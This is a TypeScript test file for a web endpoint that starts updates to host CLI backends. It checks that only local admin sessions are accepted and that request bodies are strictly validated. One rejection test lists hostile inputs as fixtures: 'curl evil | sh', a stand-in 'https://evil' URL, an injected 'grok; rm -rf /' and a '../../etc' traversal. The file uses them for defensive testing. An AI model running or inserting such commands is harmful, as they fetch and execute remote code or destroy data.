/**
 * AGEND-136 (upstream #3521): POST /ui/host-update — the Update button's request. The same gate as the install (a signed-in admin session on the local surface; never a
 * read session, a guest, the CLI's header token, the public link) and the same strict body: `{ backend }` and nothing else. The server picks the command and the audited
 * release; whatever the browser adds (a command, a version, an address) is refused before anything runs.
 */
import { ServerResponse, createServer, request, type IncomingMessage, type Server } from "node:http";
import { Readable } from "node:stream";
import { afterEach, describe, expect, it, vi } from "vitest";
import { WebSessionStore, csrfTokenFor, tokenEpoch } from "../src/web-session.js";
import { handleWebRequest, type WebApiContext } from "../src/web-api.js";
import { WebHostInstalls, type HostInstallMode, type HostInstallReporter, type HostInstallStart } from "../src/web-host-install.js";
import { WEB_SESSION_COOKIE_SECURE } from "../src/web-auth.js";
import { bindGatewayRequest } from "../src/web-request-context.js";

const servers: Server[] = [];
afterEach(async () => { for (const s of servers.splice(0)) await new Promise<void>(r => s.close(() => r())); });

async function setup(over: { start?: (backend: string, r: HostInstallReporter, mode?: HostInstallMode) => Promise<HostInstallStart> } = {}) {
  const token = "update-scratch-token", sessions = new WebSessionStore({});
  const start = vi.fn(over.start ?? (async (_b: string, r: HostInstallReporter, mode?: HostInstallMode) => { if (mode === "update") r.update?.("1.0.70", "1.0.77"); return { started: true } as HostInstallStart; }));
  const cancel = vi.fn(async () => true);
  const installs = new WebHostInstalls({
    isLocalAdmin: handle => !!sessions.findByHandle(handle) && sessions.findByHandle(handle)!.tier === "admin" && sessions.findByHandle(handle)!.surface === "local",
    installable: b => ["grok", "codex", "muse"].includes(b), updatable: b => ["grok", "codex"].includes(b), start, cancel,
  });
  const ctx = { webToken: token, webSessions: sessions, webHostInstalls: installs } as unknown as WebApiContext;
  const server = createServer((req, res) => { if (!handleWebRequest(req, res, new URL(req.url!, "http://localhost"), ctx)) { res.writeHead(404); res.end(); } });
  servers.push(server); await new Promise<void>(r => server.listen(0, "127.0.0.1", r));
  const origin = `http://127.0.0.1:${(server.address() as { port: number }).port}`;
  const as = (tier: "admin" | "read" | "guest", surface: "local" | "gateway" = "local") => {
    const m = sessions.create({ tier, surface, label: "Firefox on Linux", tokenEpoch: tokenEpoch(token), ...(surface === "gateway" ? { exposureId: "e".repeat(32) } : {}),
      ...(tier === "guest" ? { owner: { adapterId: "discord", userId: "111111111111111111" } } : {}) } as never);
    return { cookie: `agend_session=${m.sessionId}`, origin, "x-agend-csrf": csrfTokenFor(m.sessionId), "content-type": "application/json" } as Record<string, string>;
  };
  const call = (method: "GET" | "POST", path: string, headers: Record<string, string>, body?: unknown) => new Promise<{ status: number; body: any }>((resolve, reject) => {
    const data = body === undefined ? null : Buffer.from(typeof body === "string" ? body : JSON.stringify(body));
    const r = request(`${origin}${path}`, { method, headers: { ...headers, ...(data ? { "content-length": String(data.length) } : {}) } }, res => {
      const c: Buffer[] = []; res.on("data", x => c.push(x)); res.on("end", () => { const raw = Buffer.concat(c).toString(); let parsed: any = null; try { parsed = raw ? JSON.parse(raw) : null; } catch { parsed = raw; } resolve({ status: res.statusCode!, body: parsed }); });
    }); r.on("error", reject); r.end(data ?? undefined);
  });
  return { token, sessions, start, cancel, installs, ctx, as, call };
}

describe("who may ask", () => {
  it("the local admin session: the update starts in update mode, and the run says it is an update with the versions before and after", async () => {
    const t = await setup();
    const r = await t.call("POST", "/ui/host-update", t.as("admin"), { backend: "grok" });
    expect(r.status).toBe(200);
    expect(r.body.install).toMatchObject({ backend: "grok", mode: "update", phase: "running", fromVersion: "1.0.70", targetVersion: "1.0.77", startedOn: "Firefox on Linux" });
    expect(t.start).toHaveBeenCalledTimes(1);
    expect(t.start.mock.calls[0]!.slice(0, 1)).toEqual(["grok"]);
    expect(t.start.mock.calls[0]![2]).toBe("update");
    // The page reads it back from the same GET as an install.
    expect((await t.call("GET", "/ui/host-install", t.as("admin"))).body.install).toMatchObject({ mode: "update", fromVersion: "1.0.70" });
  });
  it("a read session, a guest, the web token and no session: refused, and nothing starts", async () => {
    const t = await setup();
    for (const headers of [t.as("read"), t.as("guest")]) expect((await t.call("POST", "/ui/host-update", headers, { backend: "grok" })).status).toBe(403);
    expect((await t.call("POST", "/ui/host-update", { "x-agend-token": t.token, "content-type": "application/json" }, { backend: "grok" })).status).toBe(403);
    expect([401, 403]).toContain((await t.call("POST", "/ui/host-update", { "content-type": "application/json" }, { backend: "grok" })).status);
    expect(t.start).not.toHaveBeenCalled();
  });
  it("a session made over the public link, and a request that came through it: refused", async () => {
    const t = await setup();
    expect((await t.call("POST", "/ui/host-update", t.as("admin", "gateway"), { backend: "grok" })).status).toBeGreaterThanOrEqual(401);
    const gw = t.sessions.create({ tier: "admin", surface: "gateway", exposureId: "e".repeat(32), label: "gateway", tokenEpoch: tokenEpoch(t.token) } as never);
    class Res extends ServerResponse { status = 0; override writeHead(code: number): this { this.status = code; return this; } override end(): this { return this; } }
    const req = Readable.from([]) as unknown as IncomingMessage; req.method = "POST"; req.url = "/ui/host-update";
    req.headers = { host: "localhost", cookie: `${WEB_SESSION_COOKIE_SECURE}=${gw.sessionId}` };
    Object.defineProperty(req, "socket", { value: { remoteAddress: "127.0.0.1" }, configurable: true });
    bindGatewayRequest(req, { surface: "gateway", exposureId: "e".repeat(32), expectedOrigin: "https://public.example", isCurrent: () => true });
    const res = new Res(req);
    expect(handleWebRequest(req, res, new URL("/ui/host-update", "http://localhost"), t.ctx)).toBe(true);
    await vi.waitFor(() => expect(res.status).not.toBe(0));
    expect(res.status).toBeGreaterThanOrEqual(401);
    expect(t.start).not.toHaveBeenCalled();
  });
});

describe("what is asked", () => {
  it("only { backend: <id> }: a command, a version, an address or any extra key is refused before anything runs", async () => {
    const t = await setup();
    const admin = t.as("admin");
    for (const body of [{ backend: "grok", version: "9.9.9" }, { backend: "grok", command: "curl evil | sh" }, { backend: "grok", url: "https://evil" }, { version: "1.0.77" },
      { backend: "grok; rm -rf /" }, { backend: "../../etc" }, { backend: 7 }, {}, [], "grok", "{not json"]) {
      expect((await t.call("POST", "/ui/host-update", admin, body as never)).status, JSON.stringify(body)).toBe(400);
    }
    expect(t.start).not.toHaveBeenCalled();
  });
  it("a CLI with no update (it updates itself, or the registry has none): 400 unsupported, nothing runs", async () => {
    const t = await setup();
    for (const backend of ["muse", "antigravity", "nonesuch"]) {
      const r = await t.call("POST", "/ui/host-update", t.as("admin"), { backend });
      expect([r.status, r.body], backend).toEqual([400, { error: "unsupported" }]);
    }
    expect(t.start).not.toHaveBeenCalled();
  });
  it.each([["not_installed", 409], ["up_to_date", 409], ["busy", 409], ["shutting_down", 503], ["failed", 500]] as const)("the fleet refuses with %s: its code and status come back, and no run is shown", async (code, status) => {
    const t = await setup({ start: async () => ({ refused: code }) });
    const r = await t.call("POST", "/ui/host-update", t.as("admin"), { backend: "grok" });
    expect([r.status, r.body.error]).toEqual([status, code]);
    expect(t.installs.view()).toBeNull();
  });
  it("only POST: a GET (with or without a query) is not found", async () => {
    const t = await setup();
    expect((await t.call("GET", "/ui/host-update", t.as("admin"))).status).toBe(404);
    expect((await t.call("GET", "/ui/host-update?backend=grok", t.as("admin"))).status).toBe(404);
  });
});
